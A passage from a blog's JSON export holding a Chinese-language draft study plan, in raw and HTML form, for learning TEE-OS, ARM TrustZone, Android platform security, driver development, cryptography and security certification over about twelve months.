驱动开发\n\t6.\t安全认证与攻防测试\n\t7.\t实战项目和综合运用\n\t8.\t持续进阶与社区交流\n\n在此过程中，建议你边学边做，以项目实践和代码调试为导向来加深理解。也要结合单位的真实项目需求（如支付、门禁或 DRM）来进行定制化学习，在解决实际问题中提升安全开发与系统整合能力。祝你学习与工作顺利，早日成为这一领域的专家！","source":"_drafts/plan.md","raw":"以下是一份为期 12 个月左右的学习路径和时间规划，涵盖岗位所需的关键技能（TEE-OS、安全子系统、Android 系统安全、Linux/RTOS 驱动开发、密码学、渗透测试等）。在此基础上，你可根据实际情况（工作项目进度、个人掌握速度等）进行微调。整体分为 4 个阶段，每个阶段 3 个月左右。\n\n第一阶段（第 1~3 个月）：夯实基础\n\n目标：C/C++ 能力、操作系统与安全概念、初步了解 ARM 体系结构和基本密码学原理。\n\t1.\t第 1 个月：C/C++ 加强 & 操作系统原理\n\t•\tC/C++ 回顾与强化\n\t•\t熟练掌握指针、内存管理、面向对象、多线程编程；\n\t•\t学习常见库函数与 STL 容器；\n\t•\t练习编译/链接过程，使用 GDB、LLDB 调试工具；\n\t•\t建议完成一些 LeetCode（或算法题）以及 简单命令行工具 开发提升综合运用。\n\t•\t操作系统与进程/线程安全\n\t•\t学习《Operating System Concepts》或《Modern Operating Systems》中的进程管理、内存管理、文件系统、安全机制；\n\t•\t了解用户态/内核态的概念、Linux 的权限模型（UID/GID）和权限分级。\n\t2.\t第 2 个月：ARM 架构基础 & Linux 驱动初步\n\t•\tARM 架构入门\n\t•\t阅读《ARMv7/ARMv8 Architecture Reference Manual》的基础章节，了解寄存器、异常模式、指令集（只需了解常用指令）；\n\t•\t搭建一个 QEMU + ARM 环境，尝试编译一个简易的 Linux Kernel 运行在 QEMU 中，熟悉交叉编译流程。\n\t•\tLinux 驱动开发初步\n\t•\t学习 LDD3 (Linux Device Drivers 3rd Ed.)（或更新）前几章，了解字符设备、内核日志（printk）调试；\n\t•\t试着写一个简单的 字符设备驱动，练习编译内核模块、插拔模块（insmod/rmmod）。\n\t3.\t第 3 个月：密码学和安全模型\n\t•\t对称加密 / 非对称加密 / 哈希\n\t•\t学习 AES、DES、RSA、ECC、SHA-256 等基础算法原理；\n\t•\t实验：使用 OpenSSL 或 mbedTLS 写小段代码完成加解密、签名验签、哈希运算；\n\t•\t了解 PKI / 证书（X.509）基础知识，知道如何生成自签名证书。\n\t•\t安全模型和访问控制\n\t•\t熟悉 Linux 中的 DAC、MAC（SELinux / AppArmor） 概念；\n\t•\t大体了解 Android 安全模型（应用沙箱、权限机制）。\n\n第二阶段（第 4~6 个月）：深入 ARM TrustZone 与 TEE-OS\n\n目标：掌握 TrustZone 原理，能在主流 TEE-OS（如 OP-TEE、QSEE、Trusty）上进行开发调试；理解生物识别、支付等安全业务如何在 TEE 中实现。\n\t1.\t第 4 个月：TrustZone 基本机制\n\t•\tTrustZone 关键概念\n\t•\tNormal World / Secure World、SMC（Secure Monitor Call）、中断处理、TZASC、内存隔离；\n\t•\t参考文档：ARM 官方的 Security Extensions Reference，或社区项目的博客/资料。\n\t•\t搭建实验环境\n\t•\t可选择 OP-TEE（开源且文档相对完善）在 QEMU 或者特定开发板（如 Raspberry Pi 3/4，HiKey960 等）上搭建；\n\t•\t跑通一个 Hello World TA（Trusted Application），从 Normal World 调用 Secure World 的接口。\n\t2.\t第 5 个月：TEE OS 框架与 TA 开发\n\t•\tOP-TEE / Trusty / QSEE 原理\n\t•\t学习 TEE 的进程管理、RPC 机制、存储安全等；\n\t•\t阅读 GlobalPlatform TEE 标准：Client API、Internal Core API、Security Extensions。\n\t•\tTA 编程实践\n\t•\t编写一个简易 TA，封装 AES 加密/解密或 HMAC 生成；\n\t•\t在 Normal World 写 Client 程序，通过 TEE Client API 与 TA 通信；\n\t•\t练习调试 TA：查看日志、设置断点等。\n\t3.\t第 6 个月：安全子系统（生物识别、支付、TUI、HDCP、StrongBox）\n\t•\t生物识别 & TUI\n\t•\t了解指纹/人脸识别在 TEE 中的典型实现：特征点存储、匹配流程、TUI 防截屏；\n\t•\t学习供应商/OP-TEE 提供的 例程或文档（如指纹 TA 示例）。\n\t•\t移动支付 / DRM（HDCP）\n\t•\t掌握 NFC 支付、Token 化 流程；\n\t•\tHDCP 大体原理：在 Secure World 中实现密钥交换与内容解密。\n\t•\tStrongBox\n\t•\tAndroid 的 StrongBox Keymaster / Gatekeeper：在硬件安全单元里完成密钥存储和验证；\n\t•\t学习 Android Key Attestation、SafetyNet 原理。\n\n第三阶段（第 7~9 个月）：Android 安全加固与驱动高级调试\n\n目标：对 Android 系统安全（AVB、dm-verity、SELinux 政策）有深刻理解，具备编写和调试更复杂的安全驱动或 RTOS 驱动的能力。\n\t1.\t第 7 个月：Android 系统安全\n\t•\tAVB (Android Verified Boot)\n\t•\t阅读官方文档 & 源码（AOSP 中 bootable/bootloader/*、system/core/avb 等），了解引导链、vbmeta、签名校验；\n\t•\t实践：编译一个自定义 AVB 启动流程，对 boot.img、system.img 签名并进行校验。\n\t•\tdm-verity\n\t•\t学习 dm-verity 工作原理（内核 device-mapper），如何实时校验文件系统数据完整性；\n\t•\t配置内核选项 CONFIG_DM_VERITY 并在编译时将 rootfs 或 system 分区打包成带校验树的镜像。\n\t2.\t第 8 个月：SELinux 策略 & KeyStore\n\t•\tSELinux\n\t•\t理解 DAC vs. MAC，掌握 SELinux 中的 type、domain、rule 等概念；\n\t•\t修改 AOSP SELinux 策略文件（system/sepolicy），给自定义服务或驱动分配合适权限；\n\t•\t使用 adb shell dmesg, adb logcat 分析 SELinux 拒绝日志（avc: denied）。\n\t•\tAndroid KeyStore / StrongBox\n\t•\t学习 Android 在用户态如何调用 KeyStore 服务（system/security/keystore），实际调用 TEE Keymaster TA；\n\t•\t练习：在 App 层使用 KeyGenerator/KeyPairGenerator 创建硬件级密钥，并进行签名加密。\n\t3.\t第 9 个月：Linux/RTOS 驱动进阶\n\t•\t多线程 & 同步\n\t•\t内核同步机制（spinlock、mutex、semaphore、rwlock 等），注意死锁与竞态调试；\n\t•\t高阶驱动特性\n\t•\tDMA、PCI(e) / USB / I2C / SPI 驱动编写；\n\t•\t学习 Device Tree，为目标开发板编写 DT 配置；\n\t•\tRTOS 驱动\n\t•\t选一个简单 RTOS（如 FreeRTOS、Zephyr），查看其驱动架构，移植一个小型驱动（如 LED、串口、I2C 设备等）。\n\n第四阶段（第 10~12 个月）：安全认证、攻防测试与项目实战\n\n目标：对系统进行安全评估与渗透测试；完成一到两个综合性项目，检验前面所学。\n\t1.\t第 10 个月：安全认证与渗透测试\n\t•\t行业安全标准\n\t•\t了解 FIPS 140-2/3、Common Criteria (CC EAL)、EMVCo 等，对相关流程有大体认知；\n\t•\t学习如何准备认证文档，如安全目标 (Security Target)、威胁模型、受评估范围定义等。\n\t•\t攻防测试\n\t•\t学习常见逆向分析工具：IDA Pro、Ghidra、Frida 等；\n\t•\t在测试手机/开发板上，尝试对自研 TEE APP 或安全驱动做渗透模拟（Hook、内存修改、文件篡改等），检查安全缺陷。\n\t•\t安全审计\n\t•\t使用 Cppcheck / Coverity 等工具对 C/C++ 代码进行静态分析，修复潜在风险。\n\t2.\t第 11 个月：项目实战（示例项目）\n\t•\t项目 A：Android + TEE 通信 & 生物识别\n\t•\t在 OP-TEE/Trusty 上实现一个生物识别 TA（或与已有 TA 对接），在 Normal World 写服务管理流程；\n\t•\t将采集到的指纹/人脸特征数据送入 TEE 进行匹配，并验证结果。\n\t•\t项目 B：自定义 AVB + dm-verity\n\t•\t在一块 ARM 开发板上编译自定义引导（u-boot 或 bootloader），集成 AVB；\n\t•\t为 system 分区配置 dm-verity 并验证启动成功后进行修改测试，观察系统是否能检测出篡改。\n\t3.\t第 12 个月：总结与深化\n\t•\t总结\n\t•\t整理项目中遇到的难点（驱动、密钥管理、性能、调试），撰写技术博客或学习笔记；\n\t•\t深化\n\t•\t规划下一个阶段的横向拓展：研究 Hypervisor / 虚拟化安全、更多硬件安全模块（TPM、eSE）等；\n\t•\t或更纵向专攻某块领域（如生物识别算法加速、支付安全、DRM 内容保护等）。\n\n参考资料与工具\n\t•\t操作系统 & 驱动\n\t•\t《Linux Device Drivers》 (LDD3)\n\t•\t《Understanding the Linux Kernel》\n\t•\tARM 官方手册、QEMU、GDB\n\t•\tTrustZone & TEE\n\t•\tOP-TEE 官方文档、GitHub: OP-TEE/manifest\n\t•\tARMv8 Security Extensions Reference Manual\n\t•\tGlobalPlatform TEE Specifications\n\t•\tAndroid 安全\n\t•\tAOSP 源码阅读\n\t•\tAndroid Developers 文档下的 Security、AVB、dm-verity、SELinux\n\t•\tAndroid Security Bulletins\n\t•\t密码学\n\t•\t《Applied Cryptography》 by Bruce Schneier\n\t•\tOpenSSL / mbedTLS 源码、FIPS 140-2/3 文档\n\t•\t渗透测试 & 攻防\n\t•\t《The Art of Software Security Assessment》\n\t•\tIDA Pro、Ghidra、Frida、AFL (Fuzzing) 等常用工具\n\t•\t认证 & 规范\n\t•\tCommon Criteria、FIPS、EMVCo、PCI DSS 等官方文档\n\n如何执行与保持进度\n\t1.\t每月/每周有明确目标：如“本周完成 OP-TEE 上 HelloWorld TA”，下周再做 AES-TA。\n\t2.\t做笔记与复盘：关键项目/技术点写成文档或博客，便于回顾与知识积累。\n\t3.\t结合实际项目：若工作中有真实 TEE/安全驱动需求，尽量将计划与业务需求结合，效率更高。\n\t4.\t灵活调整：若某部分进展快或慢，及时优化计划，不必拘泥于固定月份。\n\n通过上述4 个阶段、12 个月的循序渐进规划，你可以全面提升在安全子系统、TEE-OS、Android 系统安全以及Linux/RTOS 驱动开发方面的能力。过程中不断实践、调试、总结，就能为今后承担平台安全架构、关键驱动开发、乃至主导安全认证打下坚实基础。祝学习顺利、早日成为这个领域的专家！\n\n\n\n\n下面给出一个较系统、循序渐进的学习规划，帮助你围绕安全子系统、TEE-OS 等方向夯实基础、扩展技能。在实际执行中，可根据个人情况灵活调整节奏和侧重点。\n\n一、计算机与操作系统安全基础\n\t1.\t补充计算机基础知识\n\t•\t编译原理、操作系统原理、计算机体系结构：夯实对 CPU、内存管理、进程/线程调度、文件系统等底层概念的理解。\n\t•\t语言能力：C/C++ 是核心开发语言，可以结合小型项目（如移植某些开源库）来强化语法、调试能力，同时了解一点编译器、链接器的工作原理。汇编基础可以从 ARM 汇编入门（简单了解寄存器、常用指令）开始。\n\t2.\t操作系统安全概念\n\t•\t安全模型（MAC、DAC）：学习 Linux 中的 SELinux / AppArmor 等强制访问控制模型；\n\t•\t用户态与内核态：了解系统调用流程和权限隔离；\n\t•\tRoot、Sandbox、权限管理：尤其在移动端（Android）如何实现应用沙箱、权限隔离；\n\t•\t软件完整性保护：如签名校验、可执行文件验证等。\n\t3.\t加密与认证基础\n\t•\t对称加密（AES、DES）、非对称加密（RSA、ECC）、哈希算法（SHA 系列）等；\n\t•\tPKI/证书体系，常见的 X.509 证书结构、TLS 基础；\n\t•\tKey Management（密钥管理）：对关键秘钥的存储和使用策略；\n\t•\t常用密码学库：OpenSSL、mbedTLS 等，练习如何生成/验证签名、加解密操作等。\n\n目标：\n\t•\t能熟练运用 C/C++，并对操作系统安全和加密基础有扎实掌握。\n\n二、深入 ARM 架构与 TrustZone\n\t1.\tARM 架构\n\t•\tARMv7/v8 基础：对 ARM 处理器模式、指令集、特权级别有整体认识；\n\t•\t中断、异常：了解 ARM 下异常向量表、异常处理机制等；\n\t•\tMemory Management Unit (MMU)、缓存一致性、寄存器管理。\n\t2.\tARM TrustZone 技术\n\t•\tTrustZone 基本概念：Normal World / Secure World、Security Extension、TZASC (TrustZone Address Space Controller)。\n\t•\t上下文切换：如何在 SMC（Secure Monitor Call）指令的触发下进行世界切换；\n\t•\tTEE OS 的结构：Secure Monitor、Secure Kernel、Secure Service / TA（Trusted Application）间的关系。\n\t3.\t硬件安全模块\n\t•\t了解终端硬件中如何集成 eSE (embedded Secure Element)、TPM (Trusted Platform Module) 等；\n\t•\t在移动设备上常见的安全元件架构（如 Apple 的 Secure Enclave，安卓的 StrongBox / Titan M 等）。\n\n目标：\n\t•\t深刻理解 TrustZone 的安全模型与机制，为后续研究 TEE OS 打好基础。\n\n三、TEE-OS 安全业务与开发\n\t1.\tTEE-OS 原理与架构\n\t•\t常见 TEE 方案：OP-TEE、Kinibi、QSEE、Trusty 等；\n\t•\t学习其启动流程、 TA (Trusted Application) 生命周期、内存隔离、IPC 调用方式。\n\t•\t熟悉 GlobalPlatform TEE 规范：包括 TEE Client API、TEE Internal Core API、TEE Secure Element API 等。\n\t2.\t安全子系统（生物识别、支付、TUI、HDCP、StrongBox）\n\t•\t生物识别（指纹/人脸）：\n\t•\t了解传感器驱动到 TEE 中算法处理的流程、如何在安全环境中存储/对比生物特征；\n\t•\t重点掌握 TEE 生物识别相关的认证流程和隐私保护策略。\n\t•\t移动支付 / NFC 支付：\n\t•\t与 TEE 结合实现安全支付，如主流 HCE（Host Card Emulation）或 eSE 做法；\n\t•\tTUI (Trusted User Interface)：\n\t•\t在输入 PIN / 密码时，如何进入安全模式防截屏、防篡改；\n\t•\t可能需要和图形栈、显示驱动结合，确保显示/触摸事件在 Secure World 处理。\n\t•\tHDCP：\n\t•\t学习内容保护机制、key 流程，如何在 TEE 中完成加密、解密和认证；\n\t•\tStrongBox：\n\t•\tAndroid 平台提供的硬件级密钥存储，结合 TEE（或独立安全芯片）确保 Key 的不可导出。\n\t•\t熟悉 Keymaster / StrongBox Keymaster API。\n\t3.\t防篡改、防逆向\n\t•\t常见的“安全白盒”方案/代码混淆思路，可在 TEE 中执行关键操作；\n\t•\t研究安全启动链：从 Bootloader -> AVB (Android Verified Boot) -> dm-verity -> OS 加载的完整性保护机制。\n\n目标：\n\t•\t熟悉 TEE OS 工作原理、能开发或调试 Trusted Application；\n\t•\t能基于 TEE 架构实施生物识别、支付、内容保护等安全业务的设计与集成。\n\n四、Android 系统安全（AVB、dm-verity 等）\n\t1.\tAndroid Verified Boot (AVB)\n\t•\t了解 Bootloader 分级加载和分区签名验证流程；\n\t•\t研究 vbmeta、boot、system 等分区如何对其完整性和签名进行验证；\n\t•\t掌握如何定制 AVB 策略、签名工具（avbtool）。\n\t2.\tdm-verity\n\t•\t明白 dm-verity 的设备映射原理、如何对文件系统（system、vendor 等分区）进行哈希校验；\n\t•\t配置和编译内核支持 dm-verity，调试相关故障。\n\t3.\tAndroid Security Model\n\t•\tSELinux 策略编写、权限管理；\n\t•\tSystem Services / HAL 与 TEE、keystore 交互；\n\t•\tAndroid KeyStore / StrongBox API 的使用。\n\t4.\t内核安全防护\n\t•\tKASLR、SELinux、seccomp、AppArmor（在某些发行版中）等安全机制；\n\t•\t常见内核漏洞成因及修复策略。\n\n目标：\n\t•\t能在 Android 平台上进行安全加固，理解从 Bootloader 到文件系统完整性的链式验证；\n\t•\t能对系统进行定制化安全功能（如自定义签名策略、内核强化等）。\n\n五、Linux/RTOS 驱动开发与调试\n\t1.\tLinux 驱动开发\n\t•\t驱动模型与设备树（Device Tree），字符设备 / 块设备 / 网络设备驱动的区别；\n\t•\t常见接口：I2C、SPI、UART、GPIO 等；\n\t•\t了解内核态内存管理、竞争同步、调试技巧（printk、ftrace、kgdb 等）。\n\t2.\t嵌入式 RTOS 驱动\n\t•\t如果安全模块运行在某些小型 RTOS（如 FreeRTOS、ThreadX、Zephyr 等），需学习其任务调度、驱动框架、与硬件寄存器交互方式。\n\t•\t结合硬件手册进行移植和优化。\n\t3.\t安全驱动\n\t•\t例如 TUI 驱动、Secure Monitor 驱动、Crypto Engine 驱动等，如何与 TrustZone 或 TEE OS 交互；\n\t•\t解决调试权限问题（Secure World / Non-Secure World），可能需要编写特定的 SMC 调用适配层。\n\n目标：\n\t•\t能编写或移植底层驱动，理解硬件与软件系统交互；\n\t•\t掌握在安全环境下进行驱动开发/调试的要点（如权限、内存保护）。\n\n六、安全认证与测试\n\t1.\t安全认证相关标准\n\t•\t了解 FIPS 140-2/3、CC EAL (Common Criteria) 等认证体系；\n\t•\t知晓行业常见安全认证要求（金融支付、移动终端安全等），如 PCI DSS、EMVCo、UnionPay 规范等。\n\t2.\t渗透测试、攻防测试\n\t•\t学习常见的逆向分析、调试、内存注入、漏洞利用方式；\n\t•\t熟悉移动端常见的安全攻防手段（Magisk、Xposed、Hook、Rootkit 等），以及如何对抗这些攻击；\n\t•\t工具：IDA Pro、Ghidra、Frida、AFL（模糊测试）等。\n\t3.\t系统分析工具\n\t•\tAndroid 平台调试：logcat、adb shell、systrace、Perfetto 等；\n\t•\t内核调试：gdb、ftrace、KGDB；\n\t•\t代码审计工具：SonarQube、Cppcheck、Coverity。\n\n目标：\n\t•\t能够从对抗的角度审视安全方案的脆弱点；\n\t•\t具备基本的渗透测试思维，在设计、实现阶段就避免常见漏洞。\n\n七、项目实践与综合运用\n\t1.\t实践项目选题\n\t•\t开发一个简易 TEE 应用：比如在 OP-TEE 上编写 TA，实现对称加解密或密钥管理，然后在 Normal World 写 client 测试；\n\t•\t移植并自定义 AVB 或 dm-verity：配置一个自定义签名的引导流程；\n\t•\t生物识别集成：与指纹/人脸传感器驱动联动，将核心算法和特征匹配放在 Secure World；\n\t•\t安全驱动：为一个虚拟硬件加密模块写 Linux 驱动，并通过 SMC 调用到 TEE 中完成加解密。\n\t2.\t文档与设计\n\t•\t在做项目时多写设计文档、Threat Modeling，用数据流图和攻击面分析工具来评估安全风险。\n\t•\t学习如何编写安全需求说明书、如何通过单元测试/集成测试验证安全功能的正确性和鲁棒性。\n\t3.\t开源社区交流\n\t•\t多关注 GitHub/社区上的 TEE 相关项目（OP-TEE、libtee、Trusty 等），阅读源码和 issue；\n\t•\t学习其他开发者的实现思路与安全要点，及时跟进社区最新补丁与安全通告。\n\n八、持续提升与进阶\n\t1.\t跟进最新行业动态\n\t•\t关注 Android Security Bulletin、CVE 等安全漏洞公告；\n\t•\t学习顶会/黑客大会演讲（Black Hat、DEF CON、CanSecWest 等）里对移动终端和 TEE 攻击思路的前沿分享。\n\t2.\t纵深防御\n\t•\t除了 TEE 层，还可学习 container、虚拟化技术（KVM、Hypervisor）对安全加固的意义。\n\t•\t研究微架构安全问题（Meltdown、Spectre 等）及其缓解措施。\n\t3.\t获取专业认证（可选）\n\t•\t如果工作中涉及国际/金融安全标准，可关注 FIPS 140-2/3, CC EAL 评估流程，或类似的产品安全认证过程；\n\t•\t也可考虑通用安全认证如 CISSP、OSCP（偏渗透）等做综合提升（可根据职业方向选择是否深入）。\n\n总结\n\n根据岗位描述，你需要兼顾系统安全、驱动开发、TEE-OS 业务、渗透/攻防等多重技能。上面给出的学习规划从基础到进阶，涵盖了：\n\t1.\t操作系统与加密基础\n\t2.\tARM 架构与 TrustZone\n\t3.\tTEE-OS 关键安全业务\n\t4.\tAndroid 系统安全\n\t5.\tLinux/RTOS 驱动开发\n\t6.\t安全认证与攻防测试\n\t7.\t实战项目和综合运用\n\t8.\t持续进阶与社区交流\n\n在此过程中，建议你边学边做，以项目实践和代码调试为导向来加深理解。也要结合单位的真实项目需求（如支付、门禁或 DRM）来进行定制化学习，在解决实际问题中提升安全开发与系统整合能力。祝你学习与工作顺利，早日成为这一领域的专家！","slug":"plan","published":0,"date":"2025-01-12T08:12:00.678Z","updated":"2025-01-12T08:13:24.331Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cmd44rit0000iv8fyc3qw81s0","content":"<p>以下是一份为期 12 个月左右的学习路径和时间规划，涵盖岗位所需的关键技能（TEE-OS、安全子系统、Android 系统安全、Linux/RTOS 驱动开发、密码学、渗透测试等）。在此基础上，你可根据实际情况（工作项目进度、个人掌握速度等）进行微调。整体分为 4 个阶段，每个阶段 3 个月左右。</p>\n<p>第一阶段（第 1~3 个月）：夯实基础</p>\n<p>目标：C/C++ 能力、操作系统与安全概念、初步了解 ARM 体系结构和基本密码学原理。<br>    1.    第 1 个月：C/C++ 加强 &amp; 操作系统原理<br>    •    C/C++ 回顾与强化<br>    •    熟练掌握指针、内存管理、面向对象、多线程编程；<br>    •    学习常见库函数与 STL 容器；<br>    •    练习编译/链接过程，使用 GDB、LLDB 调试工具；<br>    •    建议完成一些 LeetCode（或算法题）以及 简单命令行工具 开发提升综合运用。<br>    •    操作系统与进程/线程安全<br>    •    学习《Operating System Concepts》或《Modern Operating Systems》中的进程管理、内存管理、文件系统、安全机制；<br>    •    了解用户态/内核态的概念、Linux 的权限模型（UID/GID）和权限分级。<br>    2.    第 2 个月：ARM 架构基础 &amp; Linux 驱动初步<br>    •    ARM 架构入门<br>    •    阅读《ARMv7/ARMv8 Architecture Reference Manual》的基础章节，了解寄存器、异常模式、指令集（只需了解常用指令）；<br>    •    搭建一个 QEMU + ARM 环境，尝试编译一个简易的 Linux Kernel 运行在 QEMU 中，熟悉交叉编译流程。<br>    •    Linux 驱动开发初步<br>    •    学习 LDD3 (Linux Device Drivers 3rd Ed.)（或更新）前几章，了解字符设备、内核日志（printk）调试；<br>    •    试着写一个简单的 字符设备驱动，练习编译内核模块、插拔模块（insmod/rmmod）。<br>    3.    第 3 个月：密码学和安全模型<br>    •    对称加密 / 非对称加密 / 哈希<br>    •    学习 AES、DES、RSA、ECC、SHA-256 等基础算法原理；<br>    •    实验：使用 OpenSSL 或 mbedTLS 写小段代码完成加解密、签名验签、哈希运算；<br>    •    了解 PKI / 证书（X.509）基础知识，知道如何生成自签名证书。<br>    •    安全模型和访问控制<br>    •    熟悉 Linux 中的 DAC、MAC（SELinux / AppArmor） 概念；<br>    •    大体了解 Android 安全模型（应用沙箱、权限机制）。</p>\n<p>第二阶段（第 4~6 个月）：深入 ARM TrustZone 与 TEE-OS</p>\n<p>目标：掌握 TrustZone 原理，能在主流 TEE-OS（如 OP-TEE、QSEE、Trusty）上进行开发调试；理解生物识别、支付等安全业务如何在 TEE 中实现。<br>    1.    第 4 个月：TrustZone 基本机制<br>    •    TrustZone 关键概念<br>    •    Normal World / Secure World、SMC（Secure Monitor Call）、中断处理、TZASC、内存隔离；<br>    •    参考文档：ARM 官方的 Security Extensions Reference，或社区项目的博客/资料。<br>    •    搭建实验环境<br>    •    可选择 OP-TEE（开源且文档相对完善）在 QEMU 或者特定开发板（如 Raspberry Pi 3/4，HiKey960 等）上搭建；<br>    •    跑通一个 Hello World TA（Trusted Application），从 Normal World 调用 Secure World 的接口。<br>    2.    第 5 个月：TEE OS 框架与 TA 开发<br>    •    OP-TEE / Trusty / QSEE 原理<br>    •    学习 TEE 的进程管理、RPC 机制、存储安全等；<br>    •    阅读 GlobalPlatform TEE 标准：Client API、Internal Core API、Security Extensions。<br>    •    TA 编程实践<br>    •    编写一个简易 TA，封装 AES 加密/解密或 HMAC 生成；<br>    •    在 Normal World 写 Client 程序，通过 TEE Client API 与 TA 通信；<br>    •    练习调试 TA：查看日志、设置断点等。<br>    3.    第 6 个月：安全子系统（生物识别、支付、TUI、HDCP、StrongBox）<br>    •    生物识别 &amp; TUI<br>    •    了解指纹/人脸识别在 TEE 中的典型实现：特征点存储、匹配流程、TUI 防截屏；<br>    •    学习供应商/OP-TEE 提供的 例程或文档（如指纹 TA 示例）。<br>    •    移动支付 / DRM（HDCP）<br>    •    掌握 NFC 支付、Token 化 流程；<br>    •    HDCP 大体原理：在 Secure World 中实现密钥交换与内容解密。<br>    •    StrongBox<br>    •    Android 的 StrongBox Keymaster / Gatekeeper：在硬件安全单元里完成密钥存储和验证；<br>    •    学习 Android Key Attestation、SafetyNet 原理。</p>\n<p>第三阶段（第 7~9 个月）：Android 安全加固与驱动高级调试</p>\n<p>目标：对 Android 系统安全（AVB、dm-verity、SELinux 政策）有深刻理解，具备编写和调试更复杂的安全驱动或 RTOS 驱动的能力。<br>    1.    第 7 个月：Android 系统安全<br>    •    AVB (Android Verified Boot)<br>    •    阅读官方文档 &amp; 源码（AOSP 中 bootable/bootloader/*、system/core/avb 等），了解引导链、vbmeta、签名校验；<br>    •    实践：编译一个自定义 AVB 启动流程，对 boot.img、system.img 签名并进行校验。<br>    •    dm-verity<br>    •    学习 dm-verity 工作原理（内核 device-mapper），如何实时校验文件系统数据完整性；<br>    •    配置内核选项 CONFIG_DM_VERITY 并在编译时将 rootfs 或 system 分区打包成带校验树的镜像。<br>    2.    第 8 个月：SELinux 策略 &amp; KeyStore<br>    •    SELinux<br>    •    理解 DAC vs. MAC，掌握 SELinux 中的 type、domain、rule 等概念；<br>    •    修改 AOSP SELinux 策略文件（system/sepolicy），给自定义服务或驱动分配合适权限；<br>    •    使用 adb shell dmesg, adb logcat 分析 SELinux 拒绝日志（avc: denied）。<br>    •    Android KeyStore / StrongBox<br>    •    学习 Android 在用户态如何调用 KeyStore 服务（system/security/keystore），实际调用 TEE Keymaster TA；<br>    •    练习：在 App 层使用 KeyGenerator/KeyPairGenerator 创建硬件级密钥，并进行签名加密。<br>    3.    第 9 个月：Linux/RTOS 驱动进阶<br>    •    多线程 &amp; 同步<br>    •    内核同步机制（spinlock、mutex、semaphore、rwlock 等），注意死锁与竞态调试；<br>    •    高阶驱动特性<br>    •    DMA、PCI(e) / USB / I2C / SPI 驱动编写；<br>    •    学习 Device Tree，为目标开发板编写 DT 配置；<br>    •    RTOS 驱动<br>    •    选一个简单 RTOS（如 FreeRTOS、Zephyr），查看其驱动架构，移植一个小型驱动（如 LED、串口、I2C 设备等）。</p>\n<p>第四阶段（第 10~12 个月）：安全认证、攻防测试与项目实战</p>\n<p>目标：对系统进行安全评估与渗透测试；完成一到两个综合性项目，检验前面所学。<br>    1.    第 10 个月：安全认证与渗透测试<br>    •    行业安全标准<br>    •    了解 FIPS 140-2/3、Common Criteria (CC EAL)、EMVCo 等，对相关流程有大体认知；<br>    •    学习如何准备认证文档，如安全目标 (Security Target)、威胁模型、受评估范围定义等。<br>    •    攻防测试<br>    •    学习常见逆向分析工具：IDA Pro、Ghidra、Frida 等；<br>    •    在测试手机/开发板上，尝试对自研 TEE APP 或安全驱动做渗透模拟（Hook、内存修改、文件篡改等），检查安全缺陷。<br>    •    安全审计<br>    •    使用 Cppcheck / Coverity 等工具对 C/C++ 代码进行静态分析，修复潜在风险。<br>    2.    第 11 个月：项目实战（示例项目）<br>    •    项目 A：Android + TEE 通信 &amp; 生物识别<br>    •    在 OP-TEE/Trusty 上实现一个生物识别 TA（或与已有 TA 对接），在 Normal World 写服务管理流程；<br>    •    将采集到的指纹/人脸特征数据送入 TEE 进行匹配，并验证结果。<br>    •    项目 B：自定义 AVB + dm-verity<br>    •    在一块 ARM 开发板上编译自定义引导（u-boot 或 bootloader），集成 AVB；<br>    •    为 system 分区配置 dm-verity 并验证启动成功后进行修改测试，观察系统是否能检测出篡改。<br>    3.    第 12 个月：总结与深化<br>    •    总结<br>    •    整理项目中遇到的难点（驱动、密钥管理、性能、调试），撰写技术博客或学习笔记；<br>    •    深化<br>    •    规划下一个阶段的横向拓展：研究 Hypervisor / 虚拟化安全、更多硬件安全模块（TPM、eSE）等；<br>    •    或更纵向专攻某块领域（如生物识别算法加速、支付安全、DRM 内容保护等）。</p>\n<p>参考资料与工具<br>    •    操作系统 &amp; 驱动<br>    •    《Linux Device Drivers》 (LDD3)<br>    •    《Understanding the Linux Kernel》<br>    •    ARM 官方手册、QEMU、GDB<br>    •    TrustZone &amp; TEE<br>    •    OP-TEE 官方文档、GitHub: OP-TEE/manifest<br>    •    ARMv8 Security Extensions Reference Manual<br>    •    GlobalPlatform TEE Specifications<br>    •    Android 安全<br>    •    AOSP 源码阅读<br>    •    Android Developers 文档下的 Security、AVB、dm-verity、SELinux<br>    •    Android Security Bulletins<br>    •    密码学<br>    •    《Applied Cryptography》 by Bruce Schneier<br>    •    OpenSSL / mbedTLS 源码、FIPS 140-2/3 文档<br>    •    渗透测试 &amp; 攻防<br>    •    《The Art of Software Security Assessment》<br>    •    IDA Pro、Ghidra、Frida、AFL (Fuzzing) 等常用工具<br>    •    认证 &amp; 规范<br>    •    Common Criteria、FIPS、EMVCo、PCI DSS 等官方文档</p>\n<p>如何执行与保持进度<br>    1.    每月/每周有明确目标：如“本周完成 OP-TEE 上 HelloWorld TA”，下周再做 AES-TA。<br>    2.    做笔记与复盘：关键项目/技术点写成文档或博客，便于回顾与知识积累。<br>    3.    结合实际项目：若工作中有真实 TEE/安全驱动需求，尽量将计划与业务需求结合，效率更高。<br>    4.    灵活调整：若某部分进展快或慢，及时优化计划，不必拘泥于固定月份。</p>\n<p>通过上述4 个阶段、12 个月的循序渐进规划，你可以全面提升在安全子系统、TEE-OS、Android 系统安全以及Linux/RTOS 驱动开发方面的能力。过程中不断实践、调试、总结，就能为今后承担平台安全架构、关键驱动开发、乃至主导安全认证打下坚实基础。祝学习顺利、早日成为这个领域的专家！</p>\n<p>下面给出一个较系统、循序渐进的学习规划，帮助你围绕安全子系统、TEE-OS 等方向夯实基础、扩展技能。在实际执行中，可根据个人情况灵活调整节奏和侧重点。</p>\n<p>一、计算机与操作系统安全基础<br>    1.    补充计算机基础知识<br>    •    编译原理、操作系统原理、计算机体系结构：夯实对 CPU、内存管理、进程/线程调度、文件系统等底层概念的理解。<br>    •    语言能力：C/C++ 是核心开发语言，可以结合小型项目（如移植某些开源库）来强化语法、调试能力，同时了解一点编译器、链接器的工作原理。汇编基础可以从 ARM 汇编入门（简单了解寄存器、常用指令）开始。<br>    2.    操作系统安全概念<br>    •    安全模型（MAC、DAC）：学习 Linux 中的 SELinux / AppArmor 等强制访问控制模型；<br>    •    用户态与内核态：了解系统调用流程和权限隔离；<br>    •    Root、Sandbox、权限管理：尤其在移动端（Android）如何实现应用沙箱、权限隔离；<br>    •    软件完整性保护：如签名校验、可执行文件验证等。<br>    3.    加密与认证基础<br>    •    对称加密（AES、DES）、非对称加密（RSA、ECC）、哈希算法（SHA 系列）等；<br>    •    PKI/证书体系，常见的 